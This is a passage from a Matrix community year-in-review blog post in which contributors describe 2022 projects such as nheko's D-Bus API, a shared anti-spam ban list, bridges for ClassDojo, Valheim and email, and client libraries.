&lt;p&gt;As a dedicated user of all things KDE, I make heavy use of KRunner. Naturally, I wondered if KRunner could be extended to join Matrix. This idea led me to create a D-Bus API in nheko for use on Linux. While it currently only supports a few aspects of the full Matrix experience, this API allows external software to make use of some of nheko&#x27;s functionality, including searching the room list, opening rooms, joining rooms, and creating DMs. Later, I also added support for setting status messages. Now you can write extensions for software such as &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;LorenDB&#x2F;nheko-krunner&quot;&gt;KRunner&lt;&#x2F;a&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;mzte.de&#x2F;git&#x2F;LordMZTE&#x2F;rofi-nheko&quot;&gt;rofi&lt;&#x2F;a&gt;. Alternately, you could make a plugin for your favorite game that sets your status message to let your friends know that you are busy (although no known plugins of this sort exist).&lt;&#x2F;p&gt;&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Community Moderation Effort&lt;&#x2F;h2&gt;
&lt;p&gt;A collaborative effort to moderate Matrix communities and to fight spam.&lt;&#x2F;p&gt;
&lt;p&gt;Nico mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;Some of you might have heard of us, but we are a few moderators of very
different communities, who have banded together to fight spam and share the
burden of moderating our communities. Different opinions are very hard to align,
so we have one ban list we can agree on, that only includes the most annoying
spam reasons: automated spam, crypto advertisements, gore posting and similar
stuff. This actually works very well against spammers, that just join one room
after the other to send the same content.&lt;&#x2F;p&gt;
&lt;p&gt;You can subscribe to this ban list here:
&lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;%23community-moderation-effort-bl%3Aneko.dev&quot;&gt;#community-moderation-effort-bl:neko.dev&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;We are sometimes internally discussing moderation rules, tooling and recent
events.  In the long term we hope to improve the tooling situation as well as
provide a second, stricter ban list, but we are also already very busy just
moderating our own little communities, so don&#x27;t expect much progress.&lt;&#x2F;p&gt;
&lt;p&gt;If you have a community that has been troubled by organized spam recently, maybe
our ban list can help you. You might also be interested in contacting one of us
to join the effort, just be aware that we are very careful in accepting new
members. We hope you have a spam-free and enjoyable 2023!&lt;&#x2F;p&gt;&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Matrix Releasetracker&lt;&#x2F;h2&gt;
&lt;p&gt;Release tracker that posts updates into Matrix rooms. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ananace&#x2F;matrix-releasetracker&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Ananace contributes&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;The release tracking project that has been running basically non-stop since 2018 (barring a few periods of downtime due to complete database crashes), having tracked many millions of releases for &lt;em&gt;at least&lt;&#x2F;em&gt; five people from my personally hosted instance.&lt;&#x2F;p&gt;
&lt;p&gt;2022 saw the addition of plenty of additional release sources, as well as a complete refactor of the codebase to hopefully support even more sources going forwards. It now tracks loose repositories (signed tags, lightweight tags, and&#x2F;or releases) on GitHub&#x2F;GitLab&#x2F;Gitea&#x2F;plain git, as well as supporting the tracking of entire namespaces and user stars on GitHub&#x2F;GitLab&#x2F;Gitea.&lt;&#x2F;p&gt;
&lt;p&gt;2023 should hopefully see even more work roll in, with some code underway for tracking Docker images and Helm Chart updates, as well as rework of the bot component to have it offer more use.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Self-Host a Matrix Map Tile Server&lt;&#x2F;h2&gt;
&lt;p&gt;FluffyChat implemented location sharing in Matrix last year. More recently, Element announced support for it. Interesting in Element&#x27;s announcement is not only the mechanism for sharing a location data point, but also how their matrix clients would display a little map to the recipient and how they would support the case where the data for this map display could be self-hosted. This is a blogpost&#x2F;guide to show how this could be done. &lt;a href=&quot;https:&#x2F;&#x2F;wrily.foad.me.uk&#x2F;self-host-a-matrix-map-server&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;JulianF mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;I set up my own OpenStreetMap tiles server for secure location sharing with Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;See &lt;a href=&quot;https:&#x2F;&#x2F;wrily.foad.me.uk&#x2F;self-host-a-matrix-map-server&#x2F;&quot; title=&quot;Self-Host a Matrix Map Tile Server&quot;&gt;this guide on my blog&lt;&#x2F;a&gt; which explains why and how I did it, and the &lt;a href=&quot;https:&#x2F;&#x2F;lab.trax.im&#x2F;matrix&#x2F;map-tile-server-ansible&quot; title=&quot;Map Tile Server Ansible&quot;&gt;Ansible role&lt;&#x2F;a&gt;, and the matrix discussion room &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix-map-tile-server:foad.me.uk&quot;&gt;&lt;code&gt;#matrix-map-tile-server:foad.me.uk&lt;&#x2F;code&gt;&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Matrix ClassDojo Bridge&lt;&#x2F;h2&gt;
&lt;p&gt;This bridges ClassDojo teacher-to-parent messaging facilities to matrix. &lt;a href=&quot;https:&#x2F;&#x2F;lab.trax.im&#x2F;matrix&#x2F;cdj-to-matrix&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;JulianF mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;I began a project to bridge matrix to the teacher-parent messaging silo ClassDojo, which is popular especially in USA and UK schools.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;lab.trax.im&#x2F;matrix&#x2F;cdj-to-matrix&quot;&gt;Matrix ClassDojo Bridge&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I am motivated by my loathing of being coerced into putting my private communications in yet another silo where I am restricted to accessing my messages and photos through the company&#x27;s own products which subject me to advertising and engagement tactics (&amp;quot;Your child earned a point -- click to see what for!&amp;quot;), where I cannot easily keep my own copy of my own data (&amp;quot;Subscribe now to keep your memories!&amp;quot;), and all the other typical down-sides of a Big Tech silo.&lt;&#x2F;p&gt;
&lt;p&gt;This scenario is of course exactly where Matrix shines. An ideal fit for a school&#x27;s messaging needs, scrapping the silo business model, putting the organisation in control of its own data and policies.&lt;&#x2F;p&gt;
&lt;p&gt;In the first half of 2022 I got as far as being able to do an offline demo -- manually running the fetching and bridging stages, with the teacher and class names, story text and photos bridged in the to-matrix direction.&lt;&#x2F;p&gt;
&lt;p&gt;My work on this was generously sponsored by my wife.&lt;&#x2F;p&gt;
&lt;p&gt;Since then, the project has been on hold, seeking further funding.&lt;&#x2F;p&gt;
&lt;p&gt;My next step plan for the bridge, when I can get back to it, is to adjust the bridged output to the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#social-matrix:carnot.cc&quot;&gt;matrix-for-social-media&lt;&#x2F;a&gt; formats used in &lt;a href=&quot;https:&#x2F;&#x2F;circu.li&#x2F;&quot;&gt;FUTO Circles&lt;&#x2F;a&gt; (previously &amp;quot;Circuli&amp;quot;) and &lt;a href=&quot;https:&#x2F;&#x2F;app.minestrix.henri2h.fr&#x2F;&quot;&gt;MinesTRIX&lt;&#x2F;a&gt; to present a familiar and beautiful display.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Aine&#x27;s update&lt;&#x2F;h2&gt;
&lt;p&gt;Aine, one of the people behind &lt;a href=&quot;https:&#x2F;&#x2F;etke.cc&#x2F;&quot; &gt;etke.cc&lt;&#x2F;a&gt; gives an update about what happened in the project this year as well as their contributions to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spantaleev&#x2F;matrix-docker-ansible-deploy&quot;&gt;matrix-docker-ansible-deploy&lt;&#x2F;a&gt;. &lt;a href=&quot;https:&#x2F;&#x2F;etke.cc&#x2F;&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Aine contributes&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Ohh, I don&#x27;t even know where to start and what include, to be honest 😁&lt;&#x2F;p&gt;
&lt;p&gt;The most notable changes were:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;etke.cc&#x2F;scheduler brings control over maintenance service and running services to customers. It changed our internal workflows a lot&lt;&#x2F;li&gt;
&lt;li&gt;multilingual support of etke.cc - website, guides, order processing, support. Initially we had 3 supported languages (English, German, Russian) and then dropped Russian&lt;&#x2F;li&gt;
&lt;li&gt;a lot of new components in mdad, starting with cinny and Borg backup and finishing with postmoogle&lt;&#x2F;li&gt;
&lt;li&gt;we developed several new bots and matrix-related tools&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;... Actually, a lot of things were done and much more is in progress, not sure if I can speak about upcoming changes&lt;&#x2F;p&gt;
&lt;p&gt;So, 2022 was awful, scary, heartbreaking (in a bad way), but it also was quite productive&lt;&#x2F;p&gt;&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Pauls Podcast (German tech podcast)&lt;&#x2F;h2&gt;
&lt;p&gt;A German tech podcast, that talks a lot about Matrix, but also a few other miscellaneous topics. &lt;a href=&quot;https:&#x2F;&#x2F;chrpaul.de&#x2F;podcast&#x2F;&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;jaller94 shares&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;In the beginning of the year I started a hobby podcast. Most episodes cover Matrix topics, e.g. the release of Matrix Spec v1.2, the FOSDEM 2022 and the Matrix Community Summit in Berlin.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;chrpaul.de&#x2F;podcast&#x2F;&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;https:&#x2F;&#x2F;chrpaul.de&#x2F;podcast&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Matrix dev room at FrOSCon 2022&lt;&#x2F;h2&gt;
&lt;p&gt;Every year free and open source software is celebrated and talked about at the FroSCon conference near Bonn. There was a dev room dedicated to Matrix this year. &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#FrOSCon:fiksel.info&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;jaller94 tells us&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;Every year free and open source software is celebrated and talked about at the FroSCon conference near Bonn.&lt;br&#x2F;&gt;Thousands of enthusiasts meet on a university campus for one weekend to listen to presentations, talk in dev rooms and inform themselves at booths.&lt;br&#x2F;&gt;One ecosystem and community not to miss is Matrix. We&#x27;ve had a dev room where plenty of developers, server admins and newcomers exchanged their ideas and wishes for the protocol, implementations and other aspects of Matrix.&lt;&#x2F;p&gt;
&lt;p&gt;Room link: &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#FrOSCon:fiksel.info&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;#FrOSCon:fiksel.info&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Thanks to the speakers who represented Matrix on stage! Thanks to &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@oleg:fiksel.info&quot;&gt;Oleg&lt;&#x2F;a&gt; for continually representing Matrix at FrOSCon each year! Thanks to &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;@yan:datanauten.de&quot;&gt;Yan&lt;&#x2F;a&gt; for joining me last minute and making the dev room 300% more awesome!&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Bram&#x27;s updates on Elm and activism&lt;&#x2F;h2&gt;
&lt;p&gt;A Matrix SDK in Elm. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;noordstar&#x2F;matrix-axelm&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Bram mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;h3&gt;Experience as a digital activist&lt;&#x2F;h3&gt;
&lt;p&gt;At the Matrix Community Summit 2022, I gave a talk on the struggles as a digital activist if trying to explain concepts like Matrix to politicians. The talk went very well!&lt;&#x2F;p&gt;
&lt;p&gt;I was really impressed by the knowledge and passion that many of the attendees at the Matrix Community Summit displayed, and I feel grateful to have had the opportunity to learn from and such an engaged and informed group of people. I am confident that the insights and perspectives shared at the summit will be invaluable to my activism moving forward, and I hope to have the chance to work with many of you in the future as we continue to strive for a more just and equitable world.&lt;&#x2F;p&gt;
&lt;h3&gt;Implementing Matrix in Elm&lt;&#x2F;h3&gt;
&lt;p&gt;For the past year, I have been looking for ways to implement a Matrix SDK in Elm. Elm is a functional programming language that promises to compile to lightweight JavaScript that raises zero runtime exceptions. This has been quite a learning process and I&#x27;m hoping to release a beta version early 2023.&lt;&#x2F;p&gt;
&lt;p&gt;From the past year of trying to build a functional language library, I&#x27;ve learned that:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The Matrix spec is surprisingly easy to implement in a functional programming language;&lt;&#x2F;li&gt;
&lt;li&gt;There are still a lot of ambiguities left in the Matrix spec that aren&#x27;t that big of a deal for imperative programming languages, but can mess up your codebase if you&#x27;re a functional programmer;&lt;&#x2F;li&gt;
&lt;li&gt;There appears to be a need for some single-use clients that are very good at doing a single thing. (Sending automated messages to multiple clients, moderating permissions across multiple rooms, auto-sending policies, exploring unknown access tokens).&lt;&#x2F;li&gt;
&lt;li&gt;A lot of SDK development still revolves heavily around Element and Synapse implementation. Some events weren&#x27;t part of spec yet while already widely implemented because either of those two codebases supported it.&lt;&#x2F;li&gt;
&lt;li&gt;The Elm compiler is VERY strict and unforgiving, which can be annoying at times but creates some very robust results. My hope is that rolling out client implementations will be relatively quick and easy as soon as the SDK implementation is ready.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Progress on the Elm SDK can be found over &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;noordstar&#x2F;matrix-axelm&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;here&lt;&#x2F;a&gt; but will be updated in TWIM as well. You can also view my side project of a custom event type directory over at &lt;a href=&quot;https:&#x2F;&#x2F;matrix.directory&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;https:&#x2F;&#x2F;matrix.directory&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Nico&#x27;s delight initiative&lt;&#x2F;h2&gt;
&lt;p&gt;Random Matrix related updates from Nico.&lt;&#x2F;p&gt;
&lt;p&gt;Nico mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;Nobody enjoys encountering bugs on a platform they use. So one of my goals for 2022 was to fix some of the bugs I hear often about in the hope it improves the reputation Matrix has. This often involves projects or functionality I don&#x27;t personally use, but that I can still contribute to. I think I made some progress on it. For example I fixed a bug that prevented all calls using Element Web on servers, that were not Synapse. Similarly I opened a pull request to Element Android repo, where users would get pinged by replying to a user whose userid starts with a room ping like @roomba (however that sadly isn&#x27;t merged yet). I also made various fixes to Synapse, especially related to notifications.&lt;&#x2F;p&gt;
&lt;p&gt;More long term I tried to push dehydrated devices forward (partially because of my day job) by implementing the second iteration of it: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3814&quot;&gt;MSC3814: Shriveled Sessions&lt;&#x2F;a&gt; as well as writing MSCs to one day get rid of reply fallbacks (by deprecating it and with support of &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3664&quot;&gt;MSC3664&lt;&#x2F;a&gt; allow for better control over notifications from replies. Similarly I pushed forward &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-spec-proposals&#x2F;pull&#x2F;3266&quot;&gt;MSC3266: Room Summaries&lt;&#x2F;a&gt; to improve the experience when joining rooms via knocking or restricted joins or just previewing rooms in general. (I implemented the federation parts of that MSC in Synapse as well as in several parts of Nheko).&lt;&#x2F;p&gt;
&lt;p&gt;My current work is on improving presence, since that has some fun edge cases. Fingers crossed that works out next year and I find a few more things to drive by fix. Do you have anything you have seen come up often? Maybe 2023 is the year to try to fix one of the bugs you encountered far too often? It is always easier to fix stuff, that has been annoying you, so why not try and make your own life on Matrix a little bit better? Most projects are pretty open to contributors and it also often teaches you some new skills, so there is nothing to lose but lots of time!&lt;&#x2F;p&gt;&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Valheim Matrix Bridge&lt;&#x2F;h2&gt;
&lt;p&gt;A Valheim (the game) to Matrix bridge. &lt;a href=&quot;https:&#x2F;&#x2F;nheko.im&#x2F;nheko-reborn&#x2F;valheimmatrix&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Nico mentions&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;I built a Valheim Mod to bridge Matrix messages from and to Valheim, so that I didn&#x27;t have to switch windows as often when playing with the other Nheko devs. You can find it here: &lt;a href=&quot;https:&#x2F;&#x2F;nheko.im&#x2F;nheko-reborn&#x2F;valheimmatrix&quot;&gt;https:&#x2F;&#x2F;nheko.im&#x2F;nheko-reborn&#x2F;valheimmatrix&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;neko.dev_cltTmMvhoxagKJMNiPHdcLLB.png&quot; style=&quot;display: inline-block&quot;&#x2F;&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Postmoogle&lt;&#x2F;h2&gt;
&lt;p&gt;An Email to Matrix bridge. Postmoogle is an actual SMTP server that allows you to send and receive emails on your matrix server. It can&#x27;t be used with arbitrary email providers, because it acts as an actual email provider itself, so you can use it to send emails from your apps and scripts as well. &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;etke.cc&#x2F;postmoogle&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Aine reports&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;At &lt;a href=&quot;https:&#x2F;&#x2F;etke.cc&quot;&gt;etke.cc&lt;&#x2F;a&gt; we love matrix, but have to use email as well, especially for some notification things and communication with customers. Let&#x27;s face it: email ecosystem is awful, there is no really usable and nice looking email clients that allow you to collaborate and use &amp;quot;hivemind&amp;quot; to work on emails, there is no simple backend implementations that will just work with simple configuration, and you have to dig into all that stuff on your own to understand how it works and configure it...&lt;&#x2F;p&gt;
&lt;p&gt;So, we already had experience in bringing stuff into matrix and we decided to do the same for email, that&#x27;s how Postmoogle was born.&lt;&#x2F;p&gt;
&lt;p&gt;Of course, there was email2matrix, but it&#x27;s too hard to configure and it&#x27;s intended only to receive messages.&lt;&#x2F;p&gt;
&lt;p&gt;Our &amp;quot;20 minutes adventure&amp;quot; to develop it was a hell ride with several weeks of nearly full-time working on it even on weekends, and during that time we literally studied SMTP protocol using RFCs, Wikipedia and source code of other mail servers (shoutout to Maddy - you guys did amazing work!).&lt;&#x2F;p&gt;
&lt;p&gt;It was a tough fight, but the result is satisfying - you can get an email server that handles 99% of usual email cases and uses matrix as frontend.&lt;&#x2F;p&gt;
&lt;p&gt;So, what&#x27;s the result?&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;we use Postmoogle for customer support&lt;&#x2F;li&gt;
&lt;li&gt;we offer it to customers&lt;&#x2F;li&gt;
&lt;li&gt;we have cases when people ditched regular email service (like gmail) and use postmoogle as the only email account&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Of course, we have other ideas with it, but even now it&#x27;s pretty satisfying results&lt;&#x2F;p&gt;&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Halcyon&lt;&#x2F;h2&gt;
&lt;p&gt;Halcyon is a python matrix library made with the goal of being very easy to use, and requiring no local databases. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;WesR&#x2F;Halcyon&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;↗&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;gen3 mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;Halcyon is a python matrix library made with the goal of being very easy to use, and requiring no local databases. 2022 brought a few key features that made it usable for general usage in unencrypted room (We reached milestone 2!).&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Query for room information, with automatic background updating in a local cache. (ex, get the room name, admin, moderators, etc)&lt;&#x2F;li&gt;
&lt;li&gt;Improved polling for reduced server usage and for connection with slow internet&lt;&#x2F;li&gt;
&lt;li&gt;Image sending functionality with automatic blurhash and thumbnail generation&lt;&#x2F;li&gt;
&lt;li&gt;More examples&lt;&#x2F;li&gt;
&lt;li&gt;More documentation!&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Come chat with us in  &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#halcyon:blackline.xyz&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#halcyon:blackline.xyz&lt;&#x2F;a&gt;&lt;br&#x2F;&gt;Find the library here:  &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;WesR&#x2F;Halcyon&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;WesR&#x2F;Halcyon&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;f0x&#x27; year of not-so-much Matrix&lt;&#x2F;h2&gt;
&lt;p&gt;f0x gives an update about their Matrix (and not-so-much Matrix) projects.&lt;&#x2F;p&gt;
&lt;p&gt;f0x mentions&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;Looking back I realized I didn&#x27;t do much with Matrix at all this year, besides actively using it as my main communication platform.&lt;br&#x2F;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;git.pixie.town&#x2F;f0x&#x2F;matrix-streamchat&quot;&gt;matrix-streamchat&lt;&#x2F;a&gt; had some commits at the start of the year but got abandoned shortly after. I stopped streaming myself, and others I knew&lt;br&#x2F;&gt;mostly used Owncast which had it&#x27;s own chat, which got some neat ActivityPub integration soon after too.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;git.pixie.town&#x2F;f0x&#x2F;synapse-media-proxy&quot;&gt;synapse-media-proxy&lt;&#x2F;a&gt; also had very little changes, but that&#x27;s quite good, because it&#x27;s been very solidly running in production for more than a year now,&lt;br&#x2F;&gt;running all the Matrix media for &lt;a href=&quot;https:&#x2F;&#x2F;pixie.town&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;https:&#x2F;&#x2F;pixie.town&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;There&#x27;s some stuff on the ops-side; worked on a refactor of my NixOS modules for Synapse with workers (not quite working yet). Moved all my bridges to a &lt;a href=&quot;https:&#x2F;&#x2F;git.pixie.town&#x2F;f0x&#x2F;nixos&#x2F;src&#x2F;branch&#x2F;main&#x2F;nodes&#x2F;via&quot;&gt;new NixOS host&lt;&#x2F;a&gt;. (Barely)&lt;br&#x2F;&gt;maintained my &lt;a href=&quot;https:&#x2F;&#x2F;git.pixie.town&#x2F;f0x&#x2F;matrix-appservice-irc&quot;&gt;matrix-appservice-irc fork&lt;&#x2F;a&gt;, and got some nice &lt;a href=&quot;https:&#x2F;&#x2F;git.pixie.town&#x2F;f0x&#x2F;gitea-registration-proxy&quot;&gt;clickfarm-supplied Haiku&#x27;s&lt;&#x2F;a&gt;&lt;br&#x2F;&gt;from a bot re-using an account because I still haven&#x27;t gotten around to giving it it&#x27;s own access token..&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Successful registration for jamessemith70 (jamessmithp70@gmail.com)&lt;br&#x2F;&gt;5, Frigid winter night—&lt;br&#x2F;&gt;7, even the thieves stay at home,&lt;br&#x2F;&gt;5, except for those two&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;In my non-Matrix time I&#x27;ve been working a lot on the frontend and settings interface for &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;superseriousbusiness&#x2F;gotosocial&quot;&gt;GoToSocial&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;git.pixie.town&#x2F;f0x&#x2F;fedifox&#x2F;&quot;&gt;FediFox&lt;&#x2F;a&gt; Masto-api client and Masto-api compatible alternative frontend &lt;a href=&quot;https:&#x2F;&#x2F;git.pixie.town&#x2F;f0x&#x2F;fedifox-shield&quot;&gt;FediFox Shield&lt;&#x2F;a&gt;. Article about the latter: &lt;a href=&quot;https:&#x2F;&#x2F;cthu.lu&#x2F;projects&#x2F;fedifox-shield&quot;&gt;https:&#x2F;&#x2F;cthu.lu&#x2F;projects&#x2F;fedifox-shield&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Gwmngilfen&#x27;s Matrix Year&lt;&#x2F;h2&gt;
&lt;p&gt;Gwmngilfen gives an update about their work on Matrix in 2022.&lt;&#x2F;p&gt;
&lt;p&gt;Gwmngilfen tells us&lt;&#x2F;p&gt;&lt;blockquote&gt;
&lt;p&gt;While 2021 was a big year for me in Matrix, 2022 has been one of steady progress on various projects. Being a community architect, much of those projects are &amp;quot;communities on Matrix&amp;quot; rather than code, but hey! We need users 😀. So, here&#x27;s what I&#x27;ve been up this year...&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#space:ansible.com&quot;&gt;#space:ansible.com&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Ansible started on it&#x27;s Matrix journey &lt;a href=&quot;https:&#x2F;&#x2F;emeraldreverie.org&#x2F;2021&#x2F;07&#x2F;08&#x2F;ansible_and_matrix&quot;&gt;last year&lt;&#x2F;a&gt; but the arguments I made then have proven solid. The community has seen steady decline in the number of IRC users, but a steady rise in the number of Matrix users - enough to make a positive trend overall. As of last month, we&#x27;re now at over 50% of unique MXIDs talking each day coming from Matrix vs IRC. That&#x27;s a huge milestone to have reached in just over a year!&lt;&#x2F;p&gt;
&lt;p&gt;We also used Matrix as a key part of our message to the wider tech landscape as part of our Keynote at AnsibleFest. I don&#x27;t want to make this too product-y, but you can check out that video &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;J7YRaPzKw4A?t=1819&quot;&gt;here&lt;&#x2F;a&gt; and also the interview my colleagues Adam and Carol &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=5EQjSaWRWyQ&quot;&gt;here&lt;&#x2F;a&gt; (that&#x27;s worth a look, Adam crowbars Matrix into almost every sentence 😁)&lt;&#x2F;p&gt;
&lt;p&gt;Steady progress isn&#x27;t eye catching, but I&#x27;m so pleased that the move has been a positive one, and I hope it continues in 2023.&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#rlang:matrix.org&quot;&gt;#rlang:matrix.org&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;Since part of my work involves doing data science, I&#x27;ve also been trying to boost the presence of the Rstats world on Matrix. The community there is small so far, but we&#x27;re super supportive and trying to build out our presence. My eventual goal is to make it big enough to be worth setting up a bridge to the larger Slack R4DS community (R for Data Science), but we&#x27;re not there yet. If you use R at all, come see us!&lt;&#x2F;p&gt;
&lt;h3&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;GregSutcliffe&#x2F;ChatStat&#x2F;&quot;&gt;ChatStat for data on your Matrix Rooms&lt;&#x2F;a&gt;&lt;&#x2F;h3&gt;
&lt;p&gt;The one Matrix project I did get done this year (although it hasn&#x27;t been updated in ... a while) is an R library for producing reports on Matrix rooms. I use this for gathering data on the Ansible community regularly, and it comes in two parts. The first part is the API calls to get all the events for a set of rooms over a given time and arrange it in a nice rectangular format. The second part uses this tabular data to produce reports on when people talk, who talks the most, and so on. It&#x27;s been very useful to me over the past few months to show how the trends I talk about above have developed.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2&gt;Carolinacon in matrix&lt;&#x2F;h2&gt;
